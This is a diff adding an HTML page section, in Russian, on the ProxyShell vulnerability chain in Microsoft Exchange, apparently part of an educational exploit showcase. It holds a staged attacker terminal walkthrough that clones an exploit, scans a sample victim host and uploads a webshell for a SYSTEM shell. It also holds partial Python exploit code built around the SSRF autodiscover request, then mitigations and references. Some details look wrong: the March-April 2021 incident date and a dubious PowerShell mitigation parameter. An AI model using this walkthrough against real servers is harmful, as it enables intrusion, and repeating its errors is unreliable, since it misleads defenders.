@@ -1,0 +1,220 @@
+<!-- ProxyShell Details -->
+<section class="py-20 bg-gray-900/50" id="proxyshell">
+    <div class="container mx-auto px-4">
+        <div class="exploit-detail">
+            <div class="exploit-detail__header">
+                <div class="exploit-detail__meta">
+                    <span class="exploit-detail__year">2021</span>
+                    <span class="exploit-detail__severity exploit-detail__severity--critical">Критический</span>
+                </div>
+                <h2 class="exploit-detail__title">ProxyShell (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207)</h2>
+                <p class="exploit-detail__subtitle">Цепочка уязвимостей в Microsoft Exchange Server</p>
+            </div>
+
+            <div class="exploit-detail__content">
+                <div class="exploit-detail__section">
+                    <h3 class="exploit-detail__section-title">Описание</h3>
+                    <p>ProxyShell — это цепочка из трех уязвимостей в Microsoft Exchange Server, которая позволяет удаленному злоумышленнику выполнять произвольный код на уязвимом сервере. Уязвимости получили оценку 9.8 из 10 по шкале CVSS.</p>
+                </div>
+
+                <div class="exploit-detail__section">
+                    <h3 class="exploit-detail__section-title">Технические детали</h3>
+                    <p>Уязвимости включают в себя: аутентификацию на стороне сервера (SSRF), несанкционированное повышение привилегий и произвольную запись файлов. Вместе они позволяют выполнить код от имени SYSTEM.</p>
+                    
+                    <div class="terminal my-6">
+                        <div class="terminal-header">
+                            <div class="terminal-buttons">
+                                <div class="terminal-button red"></div>
+                                <div class="terminal-button yellow"></div>
+                                <div class="terminal-button green"></div>
+                            </div>
+                            <div class="terminal-title">ProxyShell - Эксплуатация уязвимости</div>
+                        </div>
+                        <div class="terminal-body">
+                            <div class="terminal-prompt">
+                                <span class="terminal-prefix">attacker@kali</span>
+                                <span class="terminal-command"># Установка необходимых инструментов</span>
+                            </div>
+                            <div class="terminal-prompt">
+                                <span class="terminal-prefix">$</span>
+                                <span class="terminal-command">git clone https://github.com/ktecv2000/ProxyShell</span>
+                            </div>
+                            <div class="terminal-prompt">
+                                <span class="terminal-prefix">$</span>
+                                <span class="terminal-command">cd ProxyShell</span>
+                            </div>
+                            
+                            <div class="terminal-prompt mt-6">
+                                <span class="terminal-prefix">attacker@kali</span>
+                                <span class="terminal-command"># Запуск сканирования на уязвимость</span>
+                            </div>
+                            <div class="terminal-prompt">
+                                <span class="terminal-prefix">$</span>
+                                <span class="terminal-command">python3 proxyshell_scan.py -t mail.victim.com</span>
+                            </div>
+                            <div class="terminal-output text-green-400">
+                                [*] Target mail.victim.com is vulnerable to ProxyShell!
+                            </div>
+                            
+                            <div class="terminal-prompt mt-6">
+                                <span class="terminal-prefix">attacker@kali</span>
+                                <span class="terminal-command"># Запуск эксплойта</span>
+                            </div>
+                            <div class="terminal-prompt">
+                                <span class="terminal-prefix">$</span>
+                                <span class="terminal-command">python3 proxyshell.py -t mail.victim.com -u user@victim.com -f /tmp/webshell.aspx</span>
+                            </div>
+                            <div class="terminal-output text-green-400">
+                                [*] Successfully connected to Exchange server<br>
+                                [*] Got valid shell as SYSTEM!
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="terminal my-8">
+                        <div class="terminal-header">
+                            <div class="terminal-buttons">
+                                <div class="terminal-button red"></div>
+                                <div class="terminal-button yellow"></div>
+                                <div class="terminal-button green"></div>
+                            </div>
+                            <div class="terminal-title">proxyshell.py - Основная логика эксплойта</div>
+                        </div>
+                        <div class="terminal-body">
+                            <div class="terminal-code">
+<pre><code>import requests
+import sys
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+class ProxyShell:
+    def __init__(self, target, email):
+        self.target = target
+        self.email = email
+        self.session = requests.Session()
+        self.session.verify = False
+        self.fqdn = self.get_fqdn()
+        
+    def get_fqdn(self):
+        # Получаем FQDN сервера Exchange
+        url = f"https://{self.target}/autodiscover/autodiscover.json"
+        try:
+            r = self.session.get(url, timeout=10)
+            return r.headers['X-FEServer']
+        except:
+            return self.target
+
+    def get_sid(self):
+        # Используем уязвимость для получения SID пользователя
+        url = f"https://{self.target}/autodiscover/autodiscover.json?Email=autodiscover/autodiscover.json%3F@foo.{self.fqdn}"
+        headers = {
+            "Content-Type": "text/xml",
+            "User-Agent": "Mozilla/5.0"
+        }
+        # ... остальная часть кода ...
+        
+    def exploit(self):
+        # Основная логика эксплуатации
+        sid = self.get_sid()
+        if not sid:
+            print("[-] Failed to get SID")
+            return False
+            
+        # Загружаем веб-шелл
+        self.upload_webshell(sid)
+        return True</code></pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="exploit-detail__section">
+                    <h3 class="exploit-detail__section-title">Пострадавшие</h3>
+                    <ul class="exploit-detail__list">
+                        <li>Microsoft Exchange Server 2013</li>
+                        <li>Microsoft Exchange Server 2016</li>
+                        <li>Microsoft Exchange Server 2019</li>
+                        <li>Microsoft Exchange Server 2010 (только CVE-2021-34473)</li>
+                    </ul>
+                </div>
+
+                <div class="exploit-detail__section">
+                    <h3 class="exploit-detail__section-title">Известные инциденты</h3>
+                    <div class="exploit-detail__incidents">
+                        <div class="incident">
+                            <div class="incident__date">Март-апрель 2021</div>
+                            <div class="incident__description">Активные атаки на серверы Exchange по всему миру</div>
+                        </div>
+                        <div class="incident">
+                            <div class="incident__date">Июль 2021</div>
+                            <div class="incident__description">Использование уязвимостей для установки веб-шеллов и программ-вымогателей</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="exploit-detail__section">
+                    <h3 class="exploit-detail__section-title">Меры защиты</h3>
+                    
+                    <div class="terminal my-6">
+                        <div class="terminal-header">
+                            <div class="terminal-buttons">
+                                <div class="terminal-button red"></div>
+                                <div class="terminal-button yellow"></div>
+                                <div class="terminal-button green"></div>
+                            </div>
+                            <div class="terminal-title">PowerShell - Защитные меры</div>
+                        </div>
+                        <div class="terminal-body">
+                            <div class="terminal-prompt">
+                                <span class="terminal-prefix">PS C:\></span>
+                                <span class="terminal-command"># 1. Проверка установленных обновлений</span>
+                            </div>
+                            <div class="terminal-prompt">
+                                <span class="terminal-prefix">PS C:\></span>
+                                <span class="terminal-command">Get-HotFix | Where-Object {$_.HotFixID -like "KB5005043*" -or $_.HotFixID -like "KB5005039*"}</span>
+                            </div>
+                            
+                            <div class="terminal-prompt mt-6">
+                                <span class="terminal-prefix">PS C:\></span>
+                                <span class="terminal-command"># 2. Отключение удаленного PowerShell</span>
+                            </div>
+                            <div class="terminal-prompt">
+                                <span class="terminal-prefix">PS C:\></span>
+                                <span class="terminal-command">Get-User -ResultSize Unlimited | Where-Object {$_.RemotePowerShellEnabled -eq $true} | Set-User -RemotePowerShellEnabled $false</span>
+                            </div>
+                            
+                            <div class="terminal-prompt mt-6">
+                                <span class="terminal-prefix">PS C:\></span>
+                                <span class="terminal-command"># 3. Настройка URL-фильтрации</span>
+                            </div>
+                            <div class="terminal-prompt">
+                                <span class="terminal-prefix">PS C:\></span>
+                                <span class="terminal-command">Set-OrganizationConfig -DisableCustomURLCheck $false</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="mt-6">
+                        <h4 class="text-lg font-semibold mb-3">Дополнительные рекомендации:</h4>
+                        <ul class="list-disc pl-5 space-y-2 text-gray-300">
+                            <li>Установите последние накопительные обновления для Exchange Server</li>
+                            <li>Настройте брандмауэр для ограничения доступа к ECP и EWS</li>
+                            <li>Включите аудит доступа к PowerShell и Exchange Management Shell</li>
+                            <li>Регулярно проверяйте журналы событий на предмет подозрительной активности</li>
+                            <li>Используйте MFA для всех учетных записей администраторов</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="exploit-detail__section">
+                    <h3 class="exploit-detail__section-title">Дополнительные ресурсы</h3>
+                    <ul class="exploit-detail__links">
+                        <li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34473" target="_blank" rel="noopener noreferrer">Microsoft Security Response Center</a></li>
+                        <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-34473" target="_blank" rel="noopener noreferrer">NVD - CVE-2021-34473</a></li>
+                        <li><a href="https://www.cisa.gov/uscert/ncas/alerts/aa21-209a" target="_blank" rel="noopener noreferrer">CISA Alert AA21-209A</a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
